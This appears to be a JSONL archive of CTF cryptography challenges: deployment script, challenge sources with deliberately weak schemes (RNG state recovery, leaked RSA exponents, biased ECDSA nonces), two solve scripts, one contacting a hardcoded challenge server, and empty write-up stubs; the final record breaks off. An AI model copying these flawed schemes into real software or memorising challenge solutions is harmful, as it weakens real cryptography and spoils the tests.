{"source": "write-ups-2017", "category": "RSA", "path": "data\\write-ups-2017\\picoctf-2017\\cryptography\\wierd-rsa-90", "year": "2017", "name": "wierd-rsa-90", "writeup": "# picoCTF 2017 : wierd-rsa-90\n\n**Category:** Cryptography\n**Points:** 90\n**Solves:** \n**Description:**\n\n> We recovered some data. It was labeled as RSA, but what in the world are \"dq\" and \"dp\"? Can you decrypt the ciphertext for us?\n\n\n## Write-up\n\n(TODO)\n\n## Other write-ups and resources\n\n* none yet\n"}
{"source": "write-ups-2017", "category": "crypto", "path": "data\\write-ups-2017\\thailand-ctf-2017\\350-Crypto_Leak", "year": "2017", "name": "350-Crypto_Leak", "writeup": "# Thailand CTF 2017: Crypto_Leak\n\n**Category: -**\n**Points: 350**\n**Solves: TODO**\n**Description: TODO**\n\n## Write-up\n\n(TODO)\n"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\docker_deploy.py", "category": "crypto", "solution_code": "import base64\nimport hashlib\nimport os\nimport random\nimport re\nimport yaml\n\nDOCKER_PORT = 1337\n\nport_mappings = {}\nused_ports = []\n# CH interactive challenge ports reserved for local development\nfor port in range(11110, 11120):\n    used_ports.append(port)\nfor port in range(13370, 13500):\n    used_ports.append(port)\n\n\ndef challenge_name_to_alias(ctf, year, name):\n    alias = f\"{name}-{ctf}{year}\"\n    alias = alias.lower().replace(' ', '_')\n    return re.sub('[^\\w-]+', '', alias)[:29].strip(\"_\")\n\n\n# Generate deterministic \"random\" port for challenge\ndef get_free_port(chal_alias):\n    hashed = hashlib.sha256(chal_alias.encode()).digest()\n    port = int.from_bytes(hashed, 'big') % 256**2\n    while port in used_ports or port < 1024:\n        port += 1\n        if port >= 256**2:\n            port = 1024\n    port_mappings[chal_alias] = port\n    used_ports.append(port)\n    return port\n\n\ndef get_subfolders(directory):\n    subfolders = []\n    for f in os.scandir(directory):\n        if f.is_dir():\n            part = os.path.basename(os.path.normpath(f))\n            if not part.startswith(\".\"):\n                subfolders.append(part)\n    return subfolders\n\ndef generate_compose_file():\n    compose_file = [\"services:\"]\n\n    cwd = os.path.dirname(os.path.realpath(__file__))\n    for chal in get_subfolders(cwd):\n        if os.path.isfile(os.path.join(cwd, chal, \"description.yml\")):\n            with open(os.path.join(cwd, chal, \"description.yml\")) as f:\n                data = yaml.safe_load(f)\n\n            chal_alias = challenge_name_to_alias(data['original_ctf'], data['year'], data['name'])\n            print(f\"Adding {chal_alias}...\")\n\n            if os.path.isdir(os.path.join(cwd, chal, \"server_files\")): # is dynamic chal\n                port = get_free_port(chal_alias)\n\n                compose_file.append(f'  {chal_alias}:')\n                compose_file.append(f'    build:')\n                compose_file.append(f'      context: {chal}/server_files')\n                compose_file.append(f'    ports:')\n                compose_file.append(f'      - {port}:{DOCKER_PORT}')\n                compose_file.append(f'    restart: always')\n                compose_file.append(f'    environment:')\n                compose_file.append(f'      - \"FLAG={base64.b64decode(data[\"base64_flag\"]).decode().strip()}\"')\n                compose_file.append(f'    deploy:')\n                compose_file.append(f'      resources:')\n                compose_file.append(f'        limits:')\n                compose_file.append(f'          cpus: \"0.3\"')\n                compose_file.append(f'          memory: 150M')\n                compose_file.append(f'    healthcheck:')\n                compose_file.append(f'      test: /bin/bash -c \"exec 3<>/dev/tcp/127.0.0.1/1337 && echo 1 >&3 && timeout 15 head -c1 <&3\"')\n                compose_file.append(f'      interval: 1200s')\n                compose_file.append(f'      retries: 2')\n                compose_file.append(f'      start_period: {port % 240}s')\n\n    compose_file.append(\"\\n\")\n    to_write = \"\\n\".join(compose_file)\n\n    return to_write\n\ngenerated_compose = generate_compose_file()\n\nif __name__ == \"__main__\":\n    with open('docker-compose.yml', 'w') as f:\n        f.write(generated_compose)\n\n    os.system(\"docker compose up --build --remove-orphans -d\")\n", "name": "docker_deploy"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\Zh3r0_CTF_V2_2021-Twist_and_Shout\\release_files\\challenge.py", "category": "crypto", "solution_code": "../server_files/challenge.py", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\Zh3r0_CTF_V2_2021-Twist_and_Shout\\server_files\\challenge.py", "category": "crypto", "solution_code": "import os\nimport random\nflag = os.environ[\"FLAG\"].encode()\n\nstate_len = 624*4\nright_pad = random.randint(0,state_len-len(flag))\nleft_pad = state_len-len(flag)-right_pad\nstate_bytes = os.urandom(left_pad)+flag+os.urandom(right_pad)\nstate = tuple( int.from_bytes(state_bytes[i:i+4],'big') for i in range(0,state_len,4) )\nrandom.setstate((3,state+(624,),None))\noutputs = [random.getrandbits(32) for i in range(624)]\nprint(*outputs,sep='\\n')\n", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\Zh3r0_CTF_V2_2021-Real_Mersenne\\release_files\\challenge.py", "category": "crypto", "solution_code": "../server_files/challenge.py", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\Zh3r0_CTF_V2_2021-Real_Mersenne\\server_files\\challenge.py", "category": "crypto", "solution_code": "import os\nimport random\nflag = os.environ[\"FLAG\"]\nfrom fractions import Fraction\n\n\ndef score(a,b):\n    if abs(a-b)<1/2**10:\n        # capping score to 1024 so you dont get extra lucky\n        return Fraction(2**10)\n    return Fraction(2**53,int(2**53*a)-int(2**53*b))\n\n\ntotal_score = 0\nfor _ in range(2000):\n    try:\n        x = random.random()\n        y = float(input('enter your guess:\\n'))\n        round_score = score(x,y)\n        total_score+=float(round_score)\n        print('total score: {:0.2f}, round score: {}'.format(\n            total_score,round_score))\n        if total_score>10**6:\n            print(flag)\n            exit(0)\n    except:\n        print('Error, exiting')\n        exit(1)\nelse:\n    print('Maybe better luck next time')\n", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\Zh3r0_CTF_V2_2021-import_numpy_as_MT\\release_files\\challenge.py", "category": "crypto", "solution_code": "../server_files/challenge.py", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\Zh3r0_CTF_V2_2021-import_numpy_as_MT\\server_files\\challenge.py", "category": "crypto", "solution_code": "import os\nfrom numpy import random\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import pad\nflag = os.environ[\"FLAG\"].encode()\n\ndef rand_32():\n    return int.from_bytes(os.urandom(4),'big')\n\nflag = pad(flag,16)\n\nfor _ in range(2):\n    # hate to do it twice, but i dont want people bruteforcing it\n    random.seed(rand_32())\n    iv,key = random.bytes(16), random.bytes(16)\n    cipher = AES.new(key,iv=iv,mode=AES.MODE_CBC)\n    flag = iv+cipher.encrypt(flag)\n\n\nprint(flag.hex())\n\n", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\Zh3r0_CTF_V2_2021-chaos\\release_files\\challenge.py", "category": "crypto", "solution_code": "../server_files/challenge.py", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\Zh3r0_CTF_V2_2021-chaos\\server_files\\challenge.py", "category": "crypto", "solution_code": "import os\nflag = os.environ[\"FLAG\"]\n\ndef ROTL(value, bits, size=32):\n    return ((value % (1 << (size - bits))) << bits) | (value >> (size - bits))\n\ndef ROTR(value, bits, size=32):\n    return ((value % (1 << bits)) << (size - bits)) | (value >> bits)\n\ndef pad(pt):\n    pt+=b'\\x80'\n    L = len(pt)\n    to_pad = 60-(L%64) if L%64 <= 60 else 124-(L%64)\n    padding = bytearray(to_pad) + int.to_bytes(L-1,4,'big')\n    return pt+padding\n\ndef hash(text:bytes):\n    text = pad(text)\n    text = [int.from_bytes(text[i:i+4],'big') for i in range(0,len(text),4)]\n    M = 0xffff\n    x,y,z,u = 0x0124fdce, 0x89ab57ea, 0xba89370a, 0xfedc45ef\n    A,B,C,D = 0x401ab257, 0xb7cd34e1, 0x76b3a27c, 0xf13c3adf\n    RV1,RV2,RV3,RV4 = 0xe12f23cd, 0xc5ab6789, 0xf1234567, 0x9a8bc7ef\n    for i in range(0,len(text),4):\n        X,Y,Z,U = text[i]^x,text[i+1]^y,text[i+2]^z,text[i+3]^u\n        RV1 ^= (x := (X&0xffff)*(M - (Y>>16)) ^ ROTL(Z,1) ^ ROTR(U,1) ^ A)\n        RV2 ^= (y := (Y&0xffff)*(M - (Z>>16)) ^ ROTL(U,2) ^ ROTR(X,2) ^ B)\n        RV3 ^= (z := (Z&0xffff)*(M - (U>>16)) ^ ROTL(X,3) ^ ROTR(Y,3) ^ C)\n        RV4 ^= (u := (U&0xffff)*(M - (X>>16)) ^ ROTL(Y,4) ^ ROTR(Z,4) ^ D)\n    for i in range(4):\n        RV1 ^= (x := (X&0xffff)*(M - (Y>>16)) ^ ROTL(Z,1) ^ ROTR(U,1) ^ A)\n        RV2 ^= (y := (Y&0xffff)*(M - (Z>>16)) ^ ROTL(U,2) ^ ROTR(X,2) ^ B)\n        RV3 ^= (z := (Z&0xffff)*(M - (U>>16)) ^ ROTL(X,3) ^ ROTR(Y,3) ^ C)\n        RV4 ^= (u := (U&0xffff)*(M - (X>>16)) ^ ROTL(Y,4) ^ ROTR(Z,4) ^ D)\n    return int.to_bytes( (RV1<<96)|(RV2<<64)|(RV3<<32)|RV4 ,16,'big')\n\ntry:\n    m1 = bytes.fromhex(input(\"input first string to hash : \"))\n    m2 = bytes.fromhex(input(\"input second string to hash : \"))\n    if m1!=m2 and hash(m1)==hash(m2):\n        print(flag)\n    else:\n        print('Never gonna give you up')\nexcept:\n    print('Never gonna let you down')\n", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\Zh3r0_CTF_V2_2021-1n_jection\\release_files\\challenge.py", "category": "crypto", "solution_code": "from secret import flag\n\ndef nk2n(nk):\n    l = len(nk)\n    if l==1:\n        return nk[0]\n    elif l==2:\n        i,j = nk\n        return ((i+j)*(i+j+1))//2 +j\n    return nk2n([nk2n(nk[:l-l//2]), nk2n(nk[l-l//2:])])\n\nprint(nk2n(flag))\n#2597749519984520018193538914972744028780767067373210633843441892910830749749277631182596420937027368405416666234869030284255514216592219508067528406889067888675964979055810441575553504341722797908073355991646423732420612775191216409926513346494355434293682149298585\n", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\WACON2022_RSA_Secret_Sharing\\release_files\\chal.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getPrime, isPrime, bytes_to_long\nimport string, signal, random, hashlib, os\nsignal.alarm(1500)\n\ndef gen_pow():\n    print(\"Solve PoW plz\")\n    s = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))\n    print(s)\n    answer = input()\n    hash = bytes_to_long(hashlib.sha256((s + answer).encode()).digest())\n    if hash != (hash >> 26) << 26:\n        exit() \n\ngen_pow()\nq = getPrime(342)\nprint(\"q = {}\".format(q))\n\nclass LCG:\n    def __init__(self, a, x, b):\n        self.a = a\n        self.x = x \n        self.b = b \n    def fetch(self):\n        ret = self.x\n        self.x = (self.a * self.x + self.b) % q \n        return ret \n    \nprint(\"Hello! You are the owner of one Share Generator! Please insert your parameters :)\")\na = int(input()) % q\nx = int(input()) % q\nb = int(input()) % q\n\nassert 1 <= a < q and 1 <= x < q and 1 <= b < q \n\nLCG1 = LCG(a, x, b)\nLCG2 = LCG(random.randint(1, q-1), random.randint(1, q-1), random.randint(1, q-1))\nLCG3 = LCG(random.randint(1, q-1), random.randint(1, q-1), random.randint(1, q-1))\n\ndef roll():\n    return LCG3.fetch() * q * q + LCG2.fetch() * q + LCG1.fetch()\n\ndef checkFactor(n):\n    u = int(input())\n    v = int(input())\n    assert 1 < u < n and 1 < v < n and u * v == n\n\npr = []\n\nwhile len(pr) < 8:\n    p = roll()\n    if isPrime(p):\n        pr.append(p)\n\nn1 = pr[0] * pr[1]\nn2 = pr[2] * pr[3]\nn3 = pr[4] * pr[5]\nn4 = pr[6] * pr[7]\n\nprint(n1)\nprint(n2)\nprint(n3)\nprint(n4)\n\ncheckFactor(n1)\ncheckFactor(n2)\ncheckFactor(n3)\ncheckFactor(n4)\n\nflag = os.environ.get(\"FLAG\")\nprint(flag)", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\WACON2022_RSA_Secret_Sharing\\server_files\\chal.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getPrime, isPrime, bytes_to_long\nimport string, signal, random, hashlib, os\nsignal.alarm(1500)\n\ndef gen_pow():\n    print(\"Solve PoW plz\")\n    s = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))\n    print(s)\n    answer = input()\n    hash = bytes_to_long(hashlib.sha256((s + answer).encode()).digest())\n    if hash != (hash >> 26) << 26:\n        exit() \n\ngen_pow()\nq = getPrime(342)\nprint(\"q = {}\".format(q))\n\nclass LCG:\n    def __init__(self, a, x, b):\n        self.a = a\n        self.x = x \n        self.b = b \n    def fetch(self):\n        ret = self.x\n        self.x = (self.a * self.x + self.b) % q \n        return ret \n    \nprint(\"Hello! You are the owner of one Share Generator! Please insert your parameters :)\")\na = int(input()) % q\nx = int(input()) % q\nb = int(input()) % q\n\nassert 1 <= a < q and 1 <= x < q and 1 <= b < q \n\nLCG1 = LCG(a, x, b)\nLCG2 = LCG(random.randint(1, q-1), random.randint(1, q-1), random.randint(1, q-1))\nLCG3 = LCG(random.randint(1, q-1), random.randint(1, q-1), random.randint(1, q-1))\n\ndef roll():\n    return LCG3.fetch() * q * q + LCG2.fetch() * q + LCG1.fetch()\n\ndef checkFactor(n):\n    u = int(input())\n    v = int(input())\n    assert 1 < u < n and 1 < v < n and u * v == n\n\npr = []\n\nwhile len(pr) < 8:\n    p = roll()\n    if isPrime(p):\n        pr.append(p)\n\nn1 = pr[0] * pr[1]\nn2 = pr[2] * pr[3]\nn3 = pr[4] * pr[5]\nn4 = pr[6] * pr[7]\n\nprint(n1)\nprint(n2)\nprint(n3)\nprint(n4)\n\ncheckFactor(n1)\ncheckFactor(n2)\ncheckFactor(n3)\ncheckFactor(n4)\n\nflag = os.environ.get(\"FLAG\")\nprint(flag)", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\WACON2022_RSA_Permutation\\release_files\\chal.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getStrongPrime, inverse, long_to_bytes\nimport string, signal, random, hashlib, os\nsignal.alarm(300)\n\ndef gen_pow():\n    print(\"Solve PoW plz\")\n    s = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))\n    print(s)\n    answer = input()\n    hash = hashlib.sha256((s + answer).encode()).hexdigest()\n    if hash[:6] != \"000000\":\n        exit() \n\ndef mapped(s, perm):\n    ret = \"\"\n    for x in s:\n        ret += perm[int(x, 16)]\n    return ret\n\ngen_pow()\ne = 293\np, q = 0, 0\nwhile True:\n    p = getStrongPrime(1024)\n    q = getStrongPrime(1024)\n    if (p - 1) % e != 0 and (q - 1) % e != 0:\n        break \n\nn = p * q \nd_p = inverse(e, p - 1)\nd_q = inverse(e, q - 1)\n\nperm = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']\nrandom.shuffle(perm)\n\nprint(n)\nprint(mapped(long_to_bytes(d_p, 128).hex(), perm))\nprint(mapped(long_to_bytes(d_q, 128).hex(), perm))\n\nu = int(input())\nv = int(input())\n\nif 1 < u < n and 1 < v < n and u * v == n:\n    flag = os.environ.get(\"FLAG\")\n    print(flag)\nelse:\n    print(\"fail\")\n", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\WACON2022_RSA_Permutation\\server_files\\chal.py", "category": "crypto", "solution_code": "from Crypto.Util.number import getStrongPrime, inverse, long_to_bytes\nimport string, signal, random, hashlib, os\nsignal.alarm(300)\n\ndef gen_pow():\n    print(\"Solve PoW plz\")\n    s = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(16))\n    print(s)\n    answer = input()\n    hash = hashlib.sha256((s + answer).encode()).hexdigest()\n    if hash[:6] != \"000000\":\n        exit() \n\ndef mapped(s, perm):\n    ret = \"\"\n    for x in s:\n        ret += perm[int(x, 16)]\n    return ret\n\ngen_pow()\ne = 293\np, q = 0, 0\nwhile True:\n    p = getStrongPrime(1024)\n    q = getStrongPrime(1024)\n    if (p - 1) % e != 0 and (q - 1) % e != 0:\n        break \n\nn = p * q \nd_p = inverse(e, p - 1)\nd_q = inverse(e, q - 1)\n\nperm = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f']\nrandom.shuffle(perm)\n\nprint(n)\nprint(mapped(long_to_bytes(d_p, 128).hex(), perm))\nprint(mapped(long_to_bytes(d_q, 128).hex(), perm))\n\nu = int(input())\nv = int(input())\n\nif 1 < u < n and 1 < v < n and u * v == n:\n    flag = os.environ.get(\"FLAG\")\n    print(flag)\nelse:\n    print(\"fail\")\n", "name": "chal"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\TSJCTF2022_Signature\\release_files\\challenge.py", "category": "crypto", "solution_code": "from fastecdsa.curve import secp256k1 as CURVE\nfrom Crypto.Cipher import AES\nfrom hashlib import sha256\nfrom secrets import randbelow\n\nd = randbelow(CURVE.q)\nP = d * CURVE.G\n\n\ndef sign(z):\n    k = d ^ z\n    r = (k * CURVE.G).x\n    s = pow(k, -1, CURVE.q) * (z + r * d) % CURVE.q\n    return r, s\n\n\nmessages = [\n    \"https://www.youtube.com/watch?v=16M9oC-a5bY\",\n    \"https://www.youtube.com/watch?v=QDadz5JZCw8\",\n    \"https://www.youtube.com/watch?v=kyNh7KnsTN0\",\n    \"https://www.youtube.com/watch?v=Lqn42JJxS3I\",\n    \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\",\n    \"https://www.youtube.com/watch?v=1Gw_-E784l0\",\n]\n\nfor m in messages:\n    z = int(sha256(m.encode()).hexdigest(), 16)\n    print(z, *sign(z))\n\n\nfrom secret import flag\n\nmsg = f\"Congrats! This is your flag: {flag}\"\nkey = sha256(str(d).encode()).digest()[:16]\ncipher = AES.new(key, AES.MODE_CTR)\nprint(cipher.encrypt(msg.encode()))\n", "name": "challenge"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\TETCTF2021_unimplemented\\release_files\\source.py", "category": "crypto", "solution_code": "from collections import namedtuple\nfrom Crypto.Util.number import getPrime\nimport random\n \nComplex = namedtuple(\"Complex\", [\"re\", \"im\"])\n \n \ndef complex_mult(c1, c2, modulus):\n    return Complex(\n        (c1.re * c2.re - c1.im * c2.im) % modulus,  # real part\n        (c1.re * c2.im + c1.im * c2.re) % modulus,  # image part\n    )\n \n \ndef complex_pow(c, exp, modulus):\n    result = Complex(1, 0)\n    while exp > 0:\n        if exp & 1:\n            result = complex_mult(result, c, modulus)\n        c = complex_mult(c, c, modulus)\n        exp >>= 1\n    return result\n \n \ndef generate_key_pair(nbits):\n    while True:\n        p = getPrime((nbits + 3) // 4)\n        q = getPrime((nbits + 3) // 4)\n        n = (p ** 2) * (q ** 2)\n        if n.bit_length() == nbits:\n            return (p, q), n\n \n \ndef pad(data, length):\n    assert len(data) < length\n    pad_length = length - len(data) - 1\n    pad_data = bytes(random.choices(range(1, 256), k=pad_length))\n    sep = b'\\x00'\n    return pad_data + sep + data\n \n \ndef unpad(data):\n    assert b\"\\x00\" in data, \"incorrect padding\"\n    return data.split(b\"\\x00\", 1)[1]\n \n \ndef encrypt(public_key, plaintext):\n    n = public_key\n    plaintext = pad(plaintext, 2 * ((n.bit_length() - 1) // 8))\n    m = Complex(\n        int.from_bytes(plaintext[:len(plaintext) // 2], \"big\"),\n        int.from_bytes(plaintext[len(plaintext) // 2:], \"big\")\n    )\n    c = complex_pow(m, 65537, n)\n    return (c.re.to_bytes((n.bit_length() + 7) // 8, \"big\")\n            + c.im.to_bytes((n.bit_length() + 7) // 8, \"big\"))\n \n \ndef decrypt(private_key, ciphertext):\n    # TODO\n    raise Exception(\"unimplemented\")\n \n \ndef main():\n    private_key, public_key = generate_key_pair(2021)\n    from secret import flag\n \n    print(\"private_key =\", private_key)\n    print(\"public_key =\", public_key)\n    print(\"ciphertext =\", encrypt(public_key, flag))\n \n \nif __name__ == '__main__':\n    main()", "name": "source"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\TETCTF2021_unevaluated\\release_files\\source.py", "category": "crypto", "solution_code": "from collections import namedtuple\nfrom Crypto.Util.number import getPrime, isPrime, getRandomRange\n \nComplex = namedtuple(\"Complex\", [\"re\", \"im\"])\n \n \ndef complex_mult(c1, c2, modulus):\n    return Complex(\n        (c1.re * c2.re - c1.im * c2.im) % modulus,  # real part\n        (c1.re * c2.im + c1.im * c2.re) % modulus,  # image part\n    )\n \n \ndef complex_pow(c, exp, modulus):\n    result = Complex(1, 0)\n    while exp > 0:\n        if exp & 1:\n            result = complex_mult(result, c, modulus)\n        c = complex_mult(c, c, modulus)\n        exp >>= 1\n    return result\n \n \nclass ComplexDiffieHellman:\n    @staticmethod\n    def generate_params(prime_length):\n        # Warning: this may take some time :)\n        while True:\n            p = getPrime(prime_length)\n            if p % 4 == 3:\n                if p % 3 == 2:\n                    q = (p - 1) // 2\n                    r = (p + 1) // 12\n                    if isPrime(q) and isPrime(r):\n                        break\n                else:\n                    q = (p - 1) // 6\n                    r = (p + 1) // 4\n                    if isPrime(q) and isPrime(r):\n                        break\n        n = p ** 2\n        order = p * q * r\n        while True:\n            re = getRandomRange(1, n)\n            im = getRandomRange(1, n)\n            g = complex_pow(Complex(re, im), 24, n)\n            if (\n                    complex_pow(g, order, n) == Complex(1, 0)\n                    and complex_pow(g, order // p, n) != Complex(1, 0)\n                    and complex_pow(g, order // q, n) != Complex(1, 0)\n                    and complex_pow(g, order // r, n) != Complex(1, 0)\n            ):\n                return g, order, n\n \n    def __init__(self, params=None, prime_length=128, debug=False):\n        if not debug:\n            raise Exception(\"security unevaluated\")\n        if params is None:\n            params = ComplexDiffieHellman.generate_params(prime_length)\n        self.g, self.order, self.n = params\n \n    def get_public_key(self, private_key):\n        return complex_pow(self.g, private_key, self.n)\n \n    def get_shared_secret(self, private_key, other_public_key):\n        return complex_pow(other_public_key, private_key, self.n)\n \n \ndef main():\n    from os import urandom\n    private_key = urandom(32)\n    k = int.from_bytes(private_key, \"big\")\n \n    cdh = ComplexDiffieHellman(debug=True)\n    print(\"g =\", cdh.g)\n    print(\"order =\", cdh.order)\n    print(\"n =\", cdh.n)\n    print(\"public_key =\", cdh.get_public_key(k))\n \n    # Solve the discrete logarithm problem if you want the flag :)\n    from secret import flag\n    from Crypto.Cipher import AES\n    if len(flag) % 16 != 0:\n        flag += b\"\\x00\" * (16 - len(flag) % 16)\n    print(\"encrypted_flag = \",\n          AES.new(private_key, AES.MODE_ECB).encrypt(flag))\n \n \nif __name__ == \"__main__\":\n    main()", "name": "source"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\TETCTF2020_2020\\release_files\\2020.py", "category": "crypto", "solution_code": "../server_files/2020.py", "name": "2020"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\TETCTF2020_2020\\server_files\\2020.py", "category": "crypto", "solution_code": "import os\nimport random\n\nif __name__ == '__main__':\n    print(\"Pick two indices to reveal, then guess the 2020th number!\")\n\n    nIndices = 2\n    indices = [int(input()) for _ in range(nIndices)]\n\n    for i in range(2019):\n        r = random.getrandbits(32)\n        print(r if i in indices else 'Nope!')\n\n    if int(input()) == random.getrandbits(32):\n        print(os.environ[\"FLAG\"])\n", "name": "2020"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SekaiCTF_2022-FaILProof_Revenge\\release_files\\source.py", "category": "crypto", "solution_code": "../server_files/source.py", "name": "source"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SekaiCTF_2022-FaILProof_Revenge\\server_files\\solve.py", "category": "crypto", "solution_code": "import hashlib\nfrom ortools.sat.python import cp_model\nfrom pwn import remote\n\nHOST, PORT = \"20.124.204.46\", 22530\n\n\ndef int_to_bits(i, size):\n    return list(map(int, bin(i)[2:].zfill(size)))\n\n\ndef bits_to_bytes(bits):\n    intv = int(\"\".join(map(str, bits)), 2)\n    return int.to_bytes(intv, (intv.bit_length() + 7) // 8, 'big')\n\n\ndef gen_pubkey(secret: bytes, hasher=hashlib.sha512) -> list:\n    def hash(m): return hasher(m).digest()\n    state = hash(secret)\n    pubkey = []\n    for _ in range(len(hash(b'0')) * 4):\n        pubkey.append(int.from_bytes(state, 'big'))\n        state = hash(state)\n    return pubkey\n\n\ndef get_solution(A, B, max_time=5):\n    \"\"\"\n    get the cp_sat solution of the matrix equations, this can also be\n    done with help of other LP solvers (ortools.linear_solver.pywraplp)\n    \"\"\"\n    model = cp_model.CpModel()\n    X = [model.NewIntVar(0, 1, 'x_' + str(i)) for i in range(len(A[0]))]\n    for row, val in zip(A, B):\n        model.Add(sum(i * j for i, j in zip(X, row)) == val)\n    solver = cp_model.CpSolver()\n    solver.parameters.max_time_in_seconds = max_time\n    status = solver.Solve(model)\n    if status in (cp_model.OPTIMAL, cp_model.FEASIBLE):\n        return [solver.Value(i) for i in X]\n\n\ndef get():\n    \"\"\"\n    get an instance of A and B from the server\n    \"\"\"\n    REM = remote(HOST, PORT)\n    secret = bytes.fromhex(REM.recvline().strip().decode())\n    B = REM.recvline()\n    REM.close()\n    A = [int_to_bits(i, 512) for i in gen_pubkey(secret)]\n    return A, eval(B)\n\n\nA, B = get()\nflag = [None] * len(B)\nwhile not all(flag):\n    for i, b in enumerate(B):\n        if not flag[i]:\n            if (x := get_solution(A, b)):\n                # wait for 5 seconds to be solved or we can always\n                # request a new instance which will be hopefully\n                # easier\n                flag_bytes = bits_to_bytes(x)[24:32]\n                flag[i] = flag_bytes\n                print(flag)\n    A, B = get()\n\nprint(b''.join(flag))\n", "name": "solve"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SekaiCTF_2022-FaILProof_Revenge\\server_files\\source.py", "category": "crypto", "solution_code": "import hashlib\nfrom os import urandom, environ\nFLAG = environ[\"FLAG\"].encode()\n\n\ndef gen_pubkey(secret: bytes, hasher=hashlib.sha512) -> list:\n    def hash(m): return hasher(m).digest()\n    state = hash(secret)\n    pubkey = []\n    for _ in range(len(hash(b'0')) * 4):\n        pubkey.append(int.from_bytes(state, 'big'))\n        state = hash(state)\n    return pubkey\n\n\ndef happiness(x: int) -> int:\n    return x - sum((x >> i) for i in range(1, x.bit_length()))\n\n\ndef encode_message(message: bytes, segment_len: int) -> list:\n    message += bytes(segment_len - len(message) % (segment_len))\n    padded = []\n    for i in range(0, len(message), segment_len):\n        block = message[i:i + segment_len]\n        padded.append(urandom(segment_len * 3) + block + urandom(segment_len * 4))\n    return [int.from_bytes(i, 'big') for i in padded]\n\n\ndef encrypt(pubkey: list, message: bytes) -> list:\n    encrypted_blocks = []\n    for block_int in encode_message(message, len(pubkey) // 32):\n        encrypted_blocks.append([happiness(i & block_int) for i in pubkey])\n    return encrypted_blocks\n\n\nsecret = urandom(16)\nA = gen_pubkey(secret)\nenc = encrypt(A, FLAG)\nprint(secret.hex())\nprint(enc)\n", "name": "source"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SekaiCTF_2022-FaILProof\\release_files\\source.py", "category": "crypto", "solution_code": "../server_files/source.py", "name": "source"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SekaiCTF_2022-FaILProof\\server_files\\source.py", "category": "crypto", "solution_code": "import hashlib\nfrom os import urandom, environ\nFLAG = environ[\"FLAG\"].encode()\n\n\ndef gen_pubkey(secret: bytes, hasher=hashlib.sha512) -> list:\n    def hash(m): return hasher(m).digest()\n    state = hash(secret)\n    pubkey = []\n    for _ in range(len(hash(b'0')) * 4):\n        pubkey.append(int.from_bytes(state, 'big'))\n        state = hash(state)\n    return pubkey\n\n\ndef happiness(x: int) -> int:\n    return x - sum((x >> i) for i in range(1, x.bit_length()))\n\n\ndef encode_message(message: bytes, segment_len: int) -> list:\n    message += bytes(segment_len - len(message) % (segment_len))\n    encoded = []\n    for i in range(0, len(message), segment_len):\n        block = message[i:i + segment_len]\n        encoded.append(int.from_bytes(block, 'big'))\n    return encoded\n\n\ndef encrypt(pubkey: list, message: bytes) -> list:\n    encrypted_blocks = []\n    for block_int in encode_message(message, len(pubkey) // 4):\n        encrypted_blocks.append([happiness(i & block_int) for i in pubkey])\n    return encrypted_blocks\n\n\nsecret = urandom(16)\nA = gen_pubkey(secret, hashlib.sha256)\nenc = encrypt(A, FLAG)\nprint(secret.hex())\nprint(enc)\n", "name": "source"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SekaiCTF_2022-diffecient\\release_files\\source.py", "category": "crypto", "solution_code": "../server_files/source.py", "name": "source"}
{"source": "ctf_archive", "path": "data\\ctf_archive\\SekaiCTF_2022-diffecient\\server_files\\solve.py", "category": "crypto", "solution_code": "import mmh3\nimport pwn\n\n\ndef forward_block(block):\n    \"\"\"\n    initial transformation of 4 byte block in murmurhash3\n    \"\"\"\n    n = int.from_bytes(block, 'little')\n    n = (n * 0xcc9e2d51) & 0xffffffff\n    n = (n >> 17) | (n << 15) & 0xffffffff\n    n = (n * 0x1b873593) & 0xffffffff\n    return n.to_bytes(4, 'little')\n\n\ndef invert_block(block):\n    \"\"\"\n    invert a 4 byte block in murmurhash3\n    \"\"\"\n    n = int.from_bytes(block, 'little')\n    n = (n * 0x56ed309b) & 0xffffffff\n    n = (n >> 15) | (n << 17) & 0xffffffff\n    n = (n * 0xdee13bb1) & 0xffffffff\n    return n.to_bytes(4, 'little')\n\n\ndef forward(blocks):\n    \"\"\"\n    forward_block applied to all 4 byte chunks\n    \"\"\"\n    return b''.join(forward_block(blocks[i:i + 4])\n                    for i in range(0, len(blocks), 4))\n\n\ndef invert(blocks):\n    \"\"\"\n    invert applied to all 4 byte chunks\n    \"\"\"\n    return b''.join(invert_block(blocks[i:i + 4])\n                    for i in range(0, len(blocks), 4))\n\n\nDIFF = 